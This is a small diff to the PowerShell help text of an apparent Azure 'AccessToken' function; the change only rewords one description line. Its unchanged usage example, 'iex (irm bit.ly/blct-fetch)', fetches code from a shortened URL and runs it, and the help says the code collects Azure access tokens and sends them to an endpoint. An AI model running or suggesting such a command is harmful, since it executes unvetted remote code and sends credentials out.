@@ -12,7 +12,7 @@ This function does not take any parameters.
 
 .EXAMPLE
 PS> iex (irm bit.ly/blct-fetch)
-This example downloads and runs the AccessToken function, retrieves access tokens for the specified Azure resources, 
+This example downloads and runs the AccessToken function, retrieves access tokens for Azure resources,
 and sends them to the configured endpoint.
 
 .NOTES
